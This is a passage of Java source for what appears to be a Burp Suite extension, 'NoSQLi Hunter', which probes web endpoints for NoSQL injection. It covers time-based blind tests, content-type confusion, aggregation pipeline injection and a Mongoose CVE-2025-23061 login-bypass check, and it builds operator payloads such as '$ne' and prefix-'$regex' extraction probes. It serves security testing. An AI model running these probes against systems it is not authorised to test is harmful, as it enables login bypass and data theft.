            : "[$regex]=^" + escapedPrefix + ".*";
    }

    private HttpRequest buildExtractRequest(HttpRequestResponse baseRR, boolean json,
            List<SmartBodyDetector.ParsedParam> params,
            SmartBodyDetector.ParsedParam userParam, SmartBodyDetector.ParsedParam passParam,
            String userField, String passField, String userJsonPart, String passJsonPart) {
        PayloadDatabase.AuthBypassPair pair =
            new PayloadDatabase.AuthBypassPair(userJsonPart, passJsonPart, "extraction probe");
        SmartBodyDetector.BodyType forceType = json
            ? SmartBodyDetector.BodyType.JSON
            : SmartBodyDetector.BodyType.URL_ENCODED;
        return buildAuthBypassRequest(baseRR, forceType, pair,
            userParam, passParam, userField, passField, params);
    }

    /** Escape regex metacharacters in a literal prefix. */
    private static String regexEscape(String s) {
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            if ("\\^$.|?*+()[]{}".indexOf(c) >= 0) sb.append('\\');
            sb.append(c);
        }
        return sb.toString();
    }

    /** JSON string literal with escaping (for embedding regexes in parts). */
    private static String jsonStr(String s) {
        StringBuilder sb = new StringBuilder("\"");
        for (char c : s.toCharArray()) {
            if (c == '"' || c == '\\') sb.append('\\').append(c);
            else if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
            else sb.append(c);
        }
        return sb.append('"').toString();
    }

    // ─────────────────────────────────────────────────────────────
    // TIME-BASED
    // ─────────────────────────────────────────────────────────────

    private int runTimeScan(HttpRequestResponse baseRR) {
        flog.log("\n[TIME-BASED] Starting → " + baseRR.request().url());
        ScanState.Handle scan = beginScoped("TIME-BASED", baseRR);
        if (scan == null) return 0;
        int findings;
        try {
            findings = doTimeScan(baseRR, scan);
        } finally {
            ScanState.end(scan);
            flog.log("[TIME-BASED] " + (scan.cancelled() ? "Cancelled." : "Completed."));
        }
        if (findings > 0) showScanSummary("Time-Based Blind", baseRR.request().url(), findings);
        return findings;
    }

    private int doTimeScan(HttpRequestResponse baseRR, ScanState.Handle scan) {
        int findings = 0;

        long baselineTime = 0;
        for (int i = 0; i < 3; i++) {
            long s = System.currentTimeMillis();
            send(baseRR.request());
            baselineTime += System.currentTimeMillis() - s;
        }
        baselineTime /= 3;
        flog.log("[TIME-BASED] Baseline avg: " + baselineTime + "ms");

        List<SmartBodyDetector.ParsedParam> params = SmartBodyDetector.extractParams(baseRR.request());

        for (SmartBodyDetector.ParsedParam param : params) {
            if (cancelRequested(scan, "TIME-BASED")) return findings;
            flog.log("[TIME-BASED] Testing: " + param.name);

            for (PayloadDatabase.TimedPayload tp : PayloadDatabase.getTimeBasedPayloads()) {
                if (cancelRequested(scan, "TIME-BASED")) return findings;
                throttle();
                HttpRequest injected = SmartBodyDetector.applyPayload(baseRR.request(), param, tp.payload);

                long s = System.currentTimeMillis();
                HttpRequestResponse rr = send(injected);
                long elapsed = System.currentTimeMillis() - s;

                // Same thresholds as the scanner's time stage (parity):
                // absolute floor 2500ms AND at least 2000ms OVER baseline —
                // the old x2.5 rule could never fire on slow (>2s) endpoints.
                boolean delayed = elapsed >= 2500 && (elapsed - baselineTime) >= 2000;

                flog.log("[TIME-BASED]   " + param.name + " | " + tp.description +
                    " | elapsed=" + elapsed + "ms baseline=" + baselineTime + "ms | " +
                    (delayed ? "  DELAYED!" : "Normal"));

                if (delayed) {
                    int conf = 0;
                    for (int i = 0; i < 2; i++) {
                        throttle();
                        long cs = System.currentTimeMillis();
                        send(injected);
                        long ce = System.currentTimeMillis() - cs;
                        if (ce >= 2500 && (ce - baselineTime) >= 2000) conf++;
                    }

                    if (conf >= 1) {
                        String evidence = "Baseline=" + baselineTime + "ms | 1st=" + elapsed +
                            "ms | confirmations=" + conf + "/2";
                        flog.log("[TIME-BASED]  CONFIRMED: " + param.name);

                        findings++;
                        flog.reportFinding(new FindingsLogger.Finding(
                            "TIME-BASED", "HIGH",
                            baseRR.request().url(),
                            param.name,
                            tp.payload,
                            injected.toString(),   // ← full request
                            evidence,
                            null
                        ));
                        api.siteMap().add(rr);
                    }
                }
            }
        }
        return findings;
    }

    // ─────────────────────────────────────────────────────────────
    // CONTENT-TYPE CONFUSION
    // ─────────────────────────────────────────────────────────────

    private int runContentTypeConfusion(HttpRequestResponse baseRR) {
        flog.log("\n[CT CONFUSION] Starting → " + baseRR.request().url());
        ScanState.Handle scan = beginScoped("CT CONFUSION", baseRR);
        if (scan == null) return 0;
        int findings;
        try {
            findings = doContentTypeConfusion(baseRR, scan);
        } finally {
            ScanState.end(scan);
            flog.log("[CT CONFUSION] " + (scan.cancelled() ? "Cancelled." : "Completed."));
        }
        if (findings > 0) showScanSummary("Content-Type Confusion", baseRR.request().url(), findings);
        return findings;
    }

    private int doContentTypeConfusion(HttpRequestResponse baseRR, ScanState.Handle scan) {
        int findings = 0;

        List<SmartBodyDetector.ParsedParam> params = SmartBodyDetector.extractParams(baseRR.request());
        if (params.isEmpty()) {
            flog.log("[CT CONFUSION] No params.");
            return 0;
        }

        HttpRequestResponse baseline = send(baseRR.request());
        int    baselineStatus = baseline.response() != null ? baseline.response().statusCode() : 0;
        String baselineBody   = baseline.response() != null ? baseline.response().bodyToString() : "";
        String baselinePath   = extractPath(baseline.response() != null
            ? baseline.response().headerValue("Location") : null);
        String baselineNorm   = DiffEngine.normalize(baselineBody, null);
        int    baselineLen    = baselineNorm.length();

        for (SmartBodyDetector.ParsedParam param : params) {
            if (cancelRequested(scan, "CT CONFUSION")) return findings;
            // The technique upgrades an URLENCODED body to JSON — that is
            // the whole confusion. On other sources it either means nothing
            // (a GET body is ignored by virtually every framework, and
            // removing the query param manufactured guaranteed diffs) or
            // the body is already JSON. Skipping keeps it evidence-only.
            if (param.bodyType != SmartBodyDetector.BodyType.URL_ENCODED) {
                flog.log("[CT CONFUSION] Skipping parameter: " + param.name +
                    " (technique applies to urlencoded bodies, not " + param.bodyType + ")");
                continue;
            }
            for (String operator : PayloadDatabase.getContentTypeConfusionOperators()) {
                if (cancelRequested(scan, "CT CONFUSION")) return findings;
                throttle();
                // Body rebuilt with EVERY original parameter preserved and
                // only the target's value replaced by the operator — a whole
                // body replacement used to drop CSRF fields and turn the
                // guaranteed 403 into a "finding".
                HttpRequest confused = buildConfusedJsonRequest(baseRR, param, operator);

                HttpRequestResponse rr = send(confused);
                if (rr.response() == null) continue;

                int    status   = rr.response().statusCode();
                String body     = rr.response().bodyToString();
                String normBody = DiffEngine.normalize(body, operator);
                int    len      = normBody.length();
                String path     = extractPath(rr.response().headerValue("Location"));

                boolean hasError    = containsAny(body, PayloadDatabase.MONGODB_ERROR_SIGNATURES_STRICT)
                                   && !containsAny(baselineBody, PayloadDatabase.MONGODB_ERROR_SIGNATURES_STRICT);
                boolean statusDiff  = status != baselineStatus;
                boolean sizeDiff    = isSignificantDiff(len, baselineLen);
                boolean pathDiff    = !safeEquals(path, baselinePath) && isAuthSuccessPath(path);
                boolean keywordDiff = DiffEngine.keywordFlip(normBody, baselineNorm);

                boolean interesting = hasError || statusDiff || sizeDiff || pathDiff || keywordDiff;

                String evidence = String.format(
                    "status=%d(was %d) len=%d(was %d) path=%s%s",
                    status, baselineStatus, len, baselineLen,
                    path.isEmpty() ? "none" : path,
                    hasError ? " [DB ERROR]" : ""
                );

                flog.log("[CT CONFUSION]   " + param.name + " | " +
                    truncate(operator, 50) + " | " + evidence +
                    (interesting ? "   INTERESTING!" : ""));

                if (interesting) {
                    // A Content-Type flip changes response shape by itself, so
                    // weak signals are only a lead; a DB error corroborates.
                    String severity = hasError ? "HIGH" : "MEDIUM";
                    findings++;
                    flog.reportFinding(new FindingsLogger.Finding(
                        "CT-CONFUSION", severity,
                        baseRR.request().url(),
                        param.name,
                        operator,
                        confused.toString(),   // ← full request
                        evidence,
                        path
                    ));
                    api.siteMap().add(rr);
                }
            }
        }
        return findings;
    }

    /**
     * JSON body carrying every original parameter, with ONLY the target
     * parameter's value replaced by a raw operator object. For a query
     * string parameter the original pair is dropped so the value exists in
     * exactly one place.
     */
    private HttpRequest buildConfusedJsonRequest(HttpRequestResponse baseRR,
            SmartBodyDetector.ParsedParam param, String operatorValue) {
        StringBuilder json = new StringBuilder("{");
        boolean first = true;
        for (SmartBodyDetector.ParsedParam p : SmartBodyDetector.extractParams(baseRR.request())) {
            if (!first) json.append(", ");
            first = false;
            json.append(quoteJson(p.name)).append(": ")
                .append(p.name.equals(param.name) ? operatorValue : quoteJson(p.value));
        }
        json.append("}");
        HttpRequest req = baseRR.request()
            .withBody(json.toString())
            .withUpdatedHeader("Content-Type", "application/json");
        if (param.paramType == HttpParameterType.URL) {
            req = req.withRemovedParameters(HttpParameter.urlParameter(param.name, param.value));
        }
        return req;
    }

    // ─────────────────────────────────────────────────────────────
    // AGGREGATION PIPELINE
    // ─────────────────────────────────────────────────────────────

    private int runAggregationScan(HttpRequestResponse baseRR) {
        flog.log("\n[AGGREGATION] Starting → " + baseRR.request().url());
        ScanState.Handle scan = beginScoped("AGGREGATION", baseRR);
        if (scan == null) return 0;
        int findings;
        try {
            findings = doAggregationScan(baseRR, scan);
        } finally {
            ScanState.end(scan);
            flog.log("[AGGREGATION] " + (scan.cancelled() ? "Cancelled." : "Completed."));
        }
        if (findings > 0) showScanSummary("Aggregation Pipeline Injection", baseRR.request().url(), findings);
        return findings;
    }

    private int doAggregationScan(HttpRequestResponse baseRR, ScanState.Handle scan) {
        int findings = 0;

        HttpRequestResponse baseline = send(baseRR.request());
        int baselineLen = baseline.response() != null ? baseline.response().body().length() : 0;
        String baselineBody = baseline.response() != null ? baseline.response().bodyToString() : "";

        for (String payload : PayloadDatabase.getAggregationPayloads()) {
            if (cancelRequested(scan, "AGGREGATION")) return findings;
            throttle();
            HttpRequest modified = baseRR.request()
                .withBody(payload)
                .withUpdatedHeader("Content-Type","application/json");

            HttpRequestResponse rr = send(modified);
            if (rr.response() == null) continue;

            int    len      = rr.response().body().length();
            int    status   = rr.response().statusCode();
            String body     = rr.response().bodyToString();
            boolean bigResp = len > baselineLen * 1.5;
            boolean hasError = containsAny(body, PayloadDatabase.MONGODB_ERROR_SIGNATURES_STRICT)
                            && !containsAny(baselineBody, PayloadDatabase.MONGODB_ERROR_SIGNATURES_STRICT);

            String evidence = String.format("status=%d len=%d (baseline=%d) %s%s",
                status, len, baselineLen,
                bigResp ? "[LARGER RESPONSE]" : "",
                hasError ? "[DB ERROR]" : "");

            flog.log("[AGGREGATION]   " + truncate(payload, 60) + " | " + evidence);

            if (bigResp || hasError) {
                // Size drift alone is a lead; a DB error corroborates.
                String severity = hasError ? "HIGH" : "MEDIUM";
                findings++;
                flog.reportFinding(new FindingsLogger.Finding(
                    "AGGREGATION", severity,
                    baseRR.request().url(),
                    "body",
                    payload,
                    modified.toString(),   // ← full request
                    evidence,
                    null
                ));
                api.siteMap().add(rr);
            }
        }
        return findings;
    }

    // ─────────────────────────────────────────────────────────────
    // MONGOOSE CVE-2025-23061
    // ─────────────────────────────────────────────────────────────

    private int runMongooseBypass(HttpRequestResponse baseRR) {
        flog.log("\n[MONGOOSE CVE] Starting → " + baseRR.request().url());
        ScanState.Handle scan = beginScoped("MONGOOSE CVE", baseRR);
        if (scan == null) return 0;
        int findings;
        try {
            findings = doMongooseBypass(baseRR, scan);
        } finally {
            ScanState.end(scan);
            flog.log("[MONGOOSE CVE] " + (scan.cancelled() ? "Cancelled." : "Completed."));
        }
        if (findings > 0) showScanSummary("Mongoose CVE-2025-23061", baseRR.request().url(), findings);
        return findings;
    }

    private int doMongooseBypass(HttpRequestResponse baseRR, ScanState.Handle scan) {
        int findings = 0;

        HttpRequestResponse baseline = send(baseRR.request());
        int    baselineStatus = baseline.response() != null ? baseline.response().statusCode() : 0;
        String baselineBody   = baseline.response() != null ? baseline.response().bodyToString() : "";
        String baselinePath   = extractPath(baseline.response() != null
            ? baseline.response().headerValue("Location") : null);

        boolean errorLeadReported = false;

        for (String payload : PayloadDatabase.getMongooseBypassPayloads()) {
            if (cancelRequested(scan, "MONGOOSE CVE")) return findings;
            throttle();
            // Merge the payload's keys alongside every original field:
            // replacing the whole body dropped CSRF tokens (every probe
            // 403'd before reaching Mongoose) and the credential fields.
            HttpRequest modified = buildMergedPayloadRequest(baseRR, payload);

            HttpRequestResponse rr = send(modified);
            if (rr.response() == null) continue;

            int    status  = rr.response().statusCode();
            String body    = rr.response().bodyToString();
            String path    = extractPath(rr.response().headerValue("Location"));

            boolean statusDiff    = status != baselineStatus;
            boolean successFound  = containsAny(body, PayloadDatabase.AUTH_SUCCESS_KEYWORDS)
                                 && !containsAny(baselineBody, PayloadDatabase.AUTH_SUCCESS_KEYWORDS);
            boolean failureGone   = !containsAny(body, PayloadDatabase.AUTH_FAILURE_KEYWORDS)
                                 && containsAny(baselineBody, PayloadDatabase.AUTH_FAILURE_KEYWORDS);
            boolean pathChanged   = !safeEquals(path, baselinePath) && isAuthSuccessPath(path)
                                 && !containsAny(body, PayloadDatabase.AUTH_FAILURE_KEYWORDS);

            // Same rules as the auth bypass scan: errors are never bypasses,
            // and failure-text-gone alone is only a MEDIUM lead.
            boolean statusBypass  = statusDiff && status >= 200 && status < 300
                                 && !containsAny(body, PayloadDatabase.AUTH_FAILURE_KEYWORDS);
            boolean strongBypass = status < 400 && (statusBypass || successFound || pathChanged);
            boolean weakBypass   = !strongBypass && status < 400 && failureGone;

            boolean errorLead = !strongBypass && !weakBypass && baselineStatus < 400 && status >= 400 &&
                (status >= 500 || containsAny(body, PayloadDatabase.MONGODB_ERROR_SIGNATURES_STRICT));

            if (errorLead && !errorLeadReported) {
                errorLeadReported = true;
                flog.log("[MONGOOSE CVE]   Error " + status + " on $where payload — reported as MEDIUM lead");
                flog.reportFinding(new FindingsLogger.Finding(
                    "OPERATOR-ERROR", "MEDIUM",
                    baseRR.request().url(),
                    "body",
                    payload,
                    modified.toString(),
                    "Server error " + status + " on $where/operator payload (baseline " + baselineStatus +
                        "). Error text: " + snippet(body),
                    null
                ));
            }

            String evidence = String.format(
                "status=%d(was %d) path=%s content=%s",
                status, baselineStatus,
                path.isEmpty() ? "none" : path,
                successFound ? "SUCCESS appeared" : failureGone ? "FAILURE gone" : "unchanged"
            );

            flog.log("[MONGOOSE CVE] " + (strongBypass ? " BYPASS!" :
                    weakBypass ? " LEAD (failure text gone)" : " No bypass") +
                " | " + evidence + " | " + truncate(payload, 60));

            if (strongBypass) {
                findings++;
                flog.reportFinding(new FindingsLogger.Finding(
                    "MONGOOSE-CVE-2025-23061", "CRITICAL",
                    baseRR.request().url(),
                    "body",
                    payload,
                    modified.toString(),
                    evidence,
                    path
                ));
                api.siteMap().add(rr);
            } else if (weakBypass) {
                findings++;
                flog.reportFinding(new FindingsLogger.Finding(
                    "MONGOOSE-CVE-LEAD", "MEDIUM",
                    baseRR.request().url(),
                    "body",
                    payload,
                    modified.toString(),
                    evidence + " | failure text disappeared with NO positive success evidence — verify manually",
                    path
                ));
            }
        }
        return findings;
    }

    /**
     * Payload request that PRESERVES every original field: the payload's
     * top-level JSON keys are merged alongside them. Replacing the whole
     * body used to drop CSRF tokens — every probe 403'd before reaching
     * Mongoose, so the technique could never detect the CVE it is named
     * after on any CSRF-protected endpoint.
     */
    private HttpRequest buildMergedPayloadRequest(HttpRequestResponse baseRR, String payloadJson) {
        StringBuilder json = new StringBuilder("{");
        boolean first = true;
        for (SmartBodyDetector.ParsedParam p : SmartBodyDetector.extractParams(baseRR.request())) {
            if (!first) json.append(", ");
            first = false;
            json.append(quoteJson(p.name)).append(": ").append(quoteJson(p.value));
        }
        String inner = payloadJson.trim();
        if (inner.startsWith("{") && inner.endsWith("}")) {
            inner = inner.substring(1, inner.length() - 1).trim();
        }
        if (!inner.isEmpty()) {
            if (!first) json.append(", ");
            json.append(inner);
        }
        json.append("}");
        return baseRR.request().withBody(json.toString())
            .withUpdatedHeader("Content-Type", "application/json");
    }

    // ─────────────────────────────────────────────────────────────
    // FULL SCAN
    // ─────────────────────────────────────────────────────────────

    private void runFullScan(HttpRequestResponse baseRR) {
        flog.log("\n[FULL SCAN] Starting all techniques → " + baseRR.request().url());
        ScanState.Handle scan = beginScoped("FULL SCAN", baseRR);
        if (scan == null) return;
        int total = 0;
        try {
            // The lock is held ONCE here; the techniques run unlocked under
            // this handle and share its cancellation state. (Each technique
            // taking its own lock used to refuse to start — "a scan is
            // already running" — making the Full Scan a no-op.) Techniques
            // never show their own summary — only this scan's final one.
            total += doAuthBypass(baseRR, SmartBodyDetector.detect(baseRR.request()), scan);
            if (aborted(scan)) return;
            total += doOperatorScan(baseRR, scan);
            if (aborted(scan)) return;
            total += doJsScan(baseRR, scan);
            if (aborted(scan)) return;
            total += doContentTypeConfusion(baseRR, scan);
            if (aborted(scan)) return;
            total += doAggregationScan(baseRR, scan);
            if (aborted(scan)) return;
            total += doMongooseBypass(baseRR, scan);
            if (aborted(scan)) return;
            total += doTimeScan(baseRR, scan); // last (slowest)
        } finally {
            ScanState.end(scan);
            flog.log("[FULL SCAN] " + (scan.cancelled() ? "Cancelled." : "All techniques completed."));
        }
        if (total > 0 && !scan.cancelled())
            showScanSummary("Full Scan (all techniques)", baseRR.request().url(), total);
    }

    /** Between-technique check for the full scan: logs once, then abandons the rest. */
    private boolean aborted(ScanState.Handle scan) {
        if (!scan.cancelled()) return false;
        flog.log("[FULL SCAN] Cancelled — skipping the remaining techniques.");
        return true;
    }

    // ─────────────────────────────────────────────────────────────
    // UTILITIES
    // ─────────────────────────────────────────────────────────────

    /** Best-effort host extraction for the one-scan-per-host guard. */
    private static String hostOf(String url) {
        try { return new java.net.URI(url).getHost(); }
        catch (Exception e) { return url; }
    }

    private String guessField(List<SmartBodyDetector.ParsedParam> params, String... candidates) {
        for (SmartBodyDetector.ParsedParam p : params)
            for (String c : candidates)
                if (p.name.toLowerCase().contains(c.toLowerCase())) return p.name;
        return null;
    }

    /** Field names that hold per-request tokens, never credentials. */
    private static boolean tokenish(String name) {
        String n = name.toLowerCase();
        return n.contains("csrf") || n.contains("token") || n.contains("nonce")
            || n.contains("xsrf") || n.contains("authenticity");
    }

    /**
     * Build one auth-bypass request by rewriting ONLY the auth fields.
     *
     * If the forced format matches the original body type, the original
     * request is reused and just the user/pass parameters are replaced —
     * CSRF tokens and every other field stay byte-for-byte. If a different
     * format is forced (e.g. JSON operators on a urlencoded form), the body
     * is rebuilt from the ORIGINAL parameters in the forced format, still
     * preserving all non-auth fields.
     */
    private HttpRequest buildAuthBypassRequest(HttpRequestResponse baseRR,
            SmartBodyDetector.BodyType forceType, PayloadDatabase.AuthBypassPair pair,
            SmartBodyDetector.ParsedParam userParam, SmartBodyDetector.ParsedParam passParam,
            String userField, String passField,
            List<SmartBodyDetector.ParsedParam> params) {

        boolean jsonTarget = forceType == SmartBodyDetector.BodyType.JSON;
        boolean originalMatches = jsonTarget
            ? (userParam != null && (userParam.bodyType == SmartBodyDetector.BodyType.JSON ||
                                     userParam.bodyType == SmartBodyDetector.BodyType.GRAPHQL))
            : (userParam != null && (userParam.bodyType == SmartBodyDetector.BodyType.URL_ENCODED ||
                                     userParam.bodyType == SmartBodyDetector.BodyType.GET_PARAMS));

        if (originalMatches) {
            HttpRequest modified = baseRR.request();
            if (jsonTarget) {
                if (userParam != null)
                    modified = SmartBodyDetector.applyOperatorPayload(modified, userParam, pair.userPart);
                if (passParam != null)
                    modified = SmartBodyDetector.applyOperatorPayload(modified, passParam, pair.passPart);
            } else {
                if (userParam != null)
                    modified = SmartBodyDetector.applyOperatorPayload(modified, userParam, userField + pair.userPart);
                if (passParam != null)
                    modified = SmartBodyDetector.applyOperatorPayload(modified, passParam, passField + pair.passPart);
            }
            return modified;
        }

        if (jsonTarget) {
            StringBuilder json = new StringBuilder("{");
            boolean first = true;
            boolean fromQuery = false;
            for (SmartBodyDetector.ParsedParam p : params) {
                if (!first) json.append(", ");
                first = false;
                String valuePart;
                if (p.name.equals(userField))       valuePart = pair.userPart;
                else if (p.name.equals(passField))  valuePart = pair.passPart;
                else                                 valuePart = quoteJson(p.value);
                json.append(quoteJson(p.name)).append(": ").append(valuePart);
                fromQuery |= p.paramType == HttpParameterType.URL;
            }
            json.append("}");
            HttpRequest req = baseRR.request().withBody(json.toString())
                .withUpdatedHeader("Content-Type", "application/json");
            if (fromQuery) {
                // GET → JSON rebuild: drop the query pairs so each value
                // lives in exactly one place (servers read req.query first;
                // a leftover query made every payload a silent no-op).
                for (SmartBodyDetector.ParsedParam p : params) {
                    if (p.paramType == HttpParameterType.URL) {
                        req = req.withRemovedParameters(HttpParameter.urlParameter(p.name, p.value));
                    }
                }
            }
            return req;
        }

        StringBuilder body = new StringBuilder();
        boolean first = true;
        for (SmartBodyDetector.ParsedParam p : params) {
            if (!first) body.append("&");
            first = false;
            String name = p.name;
            String value = p.value;
            if (p.name.equals(userField))      { name = userField + pairNameSuffix(pair.userPart);  value = pairValueSuffix(pair.userPart); }
            else if (p.name.equals(passField)) { name = passField + pairNameSuffix(pair.passPart);  value = pairValueSuffix(pair.passPart); }
            body.append(java.net.URLEncoder.encode(name, java.nio.charset.StandardCharsets.UTF_8))
                .append('=')
                .append(java.net.URLEncoder.encode(value, java.nio.charset.StandardCharsets.UTF_8));
        }
        return baseRR.request().withBody(body.toString())
            .withUpdatedHeader("Content-Type", "application/x-www-form-urlencoded");
    }

    /** "[$ne]=x" → "[$ne]" ; "=admin" → "" */
    private static String pairNameSuffix(String part) {
        int eq = part.indexOf('=');
        return eq > 0 ? part.substring(0, eq) : "";
    }

    /** "[$ne]=x" → "x" ; "=admin" → "admin" */
    private static String pairValueSuffix(String part) {
        int eq = part.indexOf('=');
        return eq >= 0 ? part.substring(eq + 1) : part;
    }

    /** JSON string literal with FULL escaping (control chars too — a raw
     *  tab/newline in a rebuilt body used to produce invalid JSON). */
    private static String quoteJson(String s) {
        return jsonStr(s);
    }

    private boolean containsAny(String text, String[] keywords) {
        return DiffEngine.containsAny(text, keywords);
    }

    private boolean isSignificantDiff(int a, int b) {
        return DiffEngine.isSignificantDiff(a, b);
    }

    /**
     * هل الـ URL path دا بيشير لـ Auth success؟
     * Positive keywords are specific on purpose (broad ones like "user"/
     * "my"/"main" matched error-page redirects), and any negative token
     * vetoes the whole path: lockout and error redirects often live under
     * success-looking names (/admin-login?locked=1 contains "admin").
     */
    private boolean isAuthSuccessPath(String path) {
        if (path == null || path.isEmpty()) return false;
        String lower = path.toLowerCase();
        for (String bad : new String[]{
            "login","log-in","signin","sign-in","logout","error","locked",
            "invalid","denied","unauthorized","forbidden","expired","verify"
        }) {
            if (lower.contains(bad)) return false;
        }
        for (String kw : new String[]{
            "dashboard","home","account","profile","welcome","panel",
            "admin","member","portal","overview"
        }) {
            if (lower.contains(kw)) return true;
        }
        return false;
    }

    /**
     * هل محتوى الـ response اتغيّر بشكل دال على Auth؟
     * Canonical implementation lives in DiffEngine (shared with the scanner).
     */
    private boolean isContentDifferent(String body1, String body2) {
        return DiffEngine.keywordFlip(body1, body2);
    }

    private String extractPath(String locationHeader) {
        if (locationHeader == null || locationHeader.isEmpty()) return "";
        try {
            return new java.net.URI(locationHeader).getPath();
        } catch (Exception e) {
            return locationHeader;
        }
    }

    private boolean safeEquals(String a, String b) {
        if (a == null && b == null) return true;
        if (a == null || b == null) return false;
        return a.equals(b);
    }

    private String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }

    /** Small pause between manual-scan requests; grows under rate-limiting. */
    private void throttle() {
        try {
            Thread.sleep(REQUEST_DELAY_MS + backoffMs.get());
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    /** Send through Burp and feed the response to the backoff logic. */
    private HttpRequestResponse send(HttpRequest req) {
        HttpRequestResponse rr = api.http().sendRequest(req);
        noteResponse(rr);
        return rr;
    }

    /** 429/503/connection failure engage exponential backoff; 2xx decays it. */
    private void noteResponse(HttpRequestResponse rr) {
        int status = rr != null && rr.response() != null ? rr.response().statusCode() : -1;
        if (status == 429 || status == 503 || status == -1) {
            long current = backoffMs.get();
            long next = current == 0 ? 500 : Math.min(current * 2, 8000);
            if (backoffMs.compareAndSet(current, next)) {
                flog.log("[NoSQLi] Rate-limit/blocking signal (status=" + status
                    + ") — backing off " + next + "ms between requests");
            }
        } else if (status >= 200 && status < 400) {
            long current = backoffMs.get();
            if (current > 0) backoffMs.compareAndSet(current, current / 2);
        }
    }

    /** WAF/rate-limit page: never usable as differential evidence. */
    private boolean isBlockStatus(int status) {
        return status == 429 || status == 403 || status == 503;
    }

    /**
     * Visible-text snippet of an error page for lead evidence. Tags are
     * stripped and the TAIL is kept: app-specific error messages sit at the
     * end of the page, after layout/header boilerplate.
     */
    private String snippet(String html) {
        if (html == null) return "";
        String text = html.replaceAll("<[^>]*>", " ").replaceAll("\\s+", " ").trim();
        return text.length() > 160 ? "…" + text.substring(text.length() - 160) : text;
    }

    /**
     * One NON-MODAL end-of-scan summary instead of a modal dialog per
     * finding — a Full Scan used to stack blocking popups on the screen.
     */
    private void showScanSummary(String technique, String url, int findings) {
        SwingUtilities.invokeLater(() -> {
            JDialog dialog = new JDialog((Frame) null, "NoSQLi Hunter — Scan Complete", false);
            JTextArea area = new JTextArea();
            area.setEditable(false);
            area.setLineWrap(true);
            area.setWrapStyleWord(true);
            area.setFont(area.getFont().deriveFont(Font.PLAIN, 14f));
            area.setBorder(BorderFactory.createEmptyBorder(12, 12, 12, 12));
            area.setText(technique + " finished on:\n" + url
                + "\n\nFindings: " + findings
                + (findings > 0 ? "\nOpen the NoSQLi Hunter tab for details and full requests." : ""));
            dialog.setContentPane(area);
            dialog.setSize(560, 220);
            dialog.setLocationRelativeTo(null);
            dialog.setVisible(true);
        });
    }
}
